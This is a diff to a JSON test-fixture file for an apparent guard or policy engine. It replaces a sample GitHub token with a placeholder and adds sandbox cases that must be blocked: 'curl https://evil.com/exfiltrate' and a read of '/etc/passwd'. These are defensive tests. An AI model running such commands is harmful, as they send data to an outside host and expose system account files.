@@ -57,7 +57,7 @@
     },
     {
       "id": "github-pat-blocked",
-      "input": { "content": "token = \"ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij\"" },
+      "input": { "content": "token = \"ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\"" },
       "expect": "block",
       "constraintId": "no-env-in-code",
       "reason": "GitHub PATs must be blocked."
@@ -106,6 +106,26 @@
       "input": { "command": "npm run lint", "content": "const x = 1;" },
       "expect": "pass",
       "reason": "Linting is always safe."
+    },
+    {
+      "id": "sandbox-network-blocked",
+      "input": { "sandbox": "curl https://evil.com/exfiltrate" },
+      "expect": "block",
+      "constraintId": "no-sandbox-network",
+      "reason": "Network access in sandbox must be blocked."
+    },
+    {
+      "id": "sandbox-fs-escape-blocked",
+      "input": { "sandbox": "fs.readFileSync('/etc/passwd')" },
+      "expect": "block",
+      "constraintId": "no-sandbox-fs-escape",
+      "reason": "Path escape in sandbox must be blocked."
+    },
+    {
+      "id": "sandbox-safe-code-passes",
+      "input": { "sandbox": "console.log('hello from sandbox')" },
+      "expect": "pass",
+      "reason": "Safe sandbox code should pass."
     }
   ]
 }
